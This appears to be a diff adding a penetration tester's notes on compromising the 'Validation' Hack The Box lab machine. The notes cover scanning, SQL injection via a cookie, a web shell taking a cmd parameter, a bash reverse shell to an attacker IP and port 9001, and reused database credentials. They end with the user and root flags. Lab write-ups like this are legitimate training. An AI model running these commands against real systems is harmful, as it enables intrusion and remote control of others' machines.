@@ -1,0 +1,66 @@
+Machine-Name : Validation
+IP-Address   : 10.129.226.233
+
+Command-Line: sudo nmap 10.129.226.233 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 50 -i 200-205,301,302,403 -u http://10.129.95.235 -o ~/HTB/Machines/Validation_NF/recon/recon-1.txt
+
+Browser: http://10.129.226.233
+Notes: Registration of page, with username and drop-down of country. Intercepting with BurpSuite to test for SQL injection.
+Result:
+    ./screenshots/burpsuite-1.png
+
+Notes: After sending, I allowed the page to be "Forwarded". Taking the cookie from BurpSuite with the SQL injecting and replacing the storage cookie with it on the browser.
+Result:
+    ./screenshots/sql-cookie-1.png
+
+Notes: Testing possible "union select" injection.
+Result:
+    ./screenshots/union-select-1.png
+
+Notes: Replacing new cookie in browser.
+Result:
+    ./screenshots/union-select-test-browser.png
+    *** SUCCESSFUL ***
+
+Notes: Trying to inject a malicious script.
+Result:
+    ./screenshots/malicious-script-1.png
+
+Notes: Taking the cookie and replacing it in the browser.
+Result:
+    ./screenshots/union-select-2.png
+
+Browser: http://10.129.226.233/shell-1.php?cmd=whoami
+Notes: Command injection calling "whoami"
+Result:
+    ./screenshots/cmd-injection-1.png
+    *** SUCCESSFUL ***
+
+Notes: Sending http://10.129.226.233/shell-1.php?cmd=whoami to BurpSuite. Running "Code" below to get a reverse-shell on local machine.
+Code: GET /shell-1.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1'
+Command-Line: nc -lvnp 9001
+Result:
+    ./screenshots/burpsuite-2.png
+    *** SUCCESSFUL ***
+    *** REVERSE SHELL ***
+
+Notes: Found DB credentials which hint at being a global password. Trying to login as root.
+Credentials-Found (config.php):
+    <?php
+      $servername = "127.0.0.1";
+      $username = "uhc";
+      $password = "uhc-9qual-global-pw";
+      $dbname = "registration";
+
+      $conn = new mysqli($servername, $username, $password, $dbname);
+    ?>
+Result:
+    ./screenshots/root-user-priv.png
+
+user:0c2b03f75061ffbda81743ac6db04ef6
+root:4f19dd8f4e3e2048c86c0d4ecfb57469
+
+    *** FINISHED ***
